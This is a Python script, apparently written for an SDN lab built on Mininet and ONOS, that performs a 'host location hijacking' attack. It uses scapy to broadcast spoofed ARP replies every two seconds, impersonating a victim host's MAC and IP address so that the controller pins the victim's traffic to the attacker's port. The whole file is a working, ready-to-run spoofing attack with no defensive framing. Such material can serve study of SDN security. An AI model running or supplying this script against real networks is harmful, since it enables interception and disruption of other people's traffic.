#!/usr/bin/env python3
"""Host Location Hijacking - sustained poison (no identity change)."""
import time
from scapy.all import Ether, ARP, sendp

VICTIM_MAC     = "00:00:00:00:00:02"   # h1's MAC (confirm in ONOS 'hosts')
VICTIM_IP      = "10.0.10.11"          # h1's IP (routed topology)
ATTACKER_IFACE = "atk-eth0"
INTERVAL       = 2

pkt = Ether(src=VICTIM_MAC, dst="ff:ff:ff:ff:ff:ff") / \
      ARP(op=2, hwsrc=VICTIM_MAC, psrc=VICTIM_IP,
          hwdst="ff:ff:ff:ff:ff:ff", pdst=VICTIM_IP)
print(f"[*] Sustained HLHA: claiming to be {VICTIM_IP} ({VICTIM_MAC}) from {ATTACKER_IFACE}")
print(f"[*] Re-poisoning every {INTERVAL}s. Press Ctrl+C to stop.")
n = 0
try:
    while True:
        sendp(pkt, iface=ATTACKER_IFACE, verbose=False)
        n += 1
        print(f"[+] poison #{n} sent - keeping {VICTIM_IP} pinned to the attacker's port")
        time.sleep(INTERVAL)
except KeyboardInterrupt:
    print(f"\n[*] Stopped after {n} poisonings.")
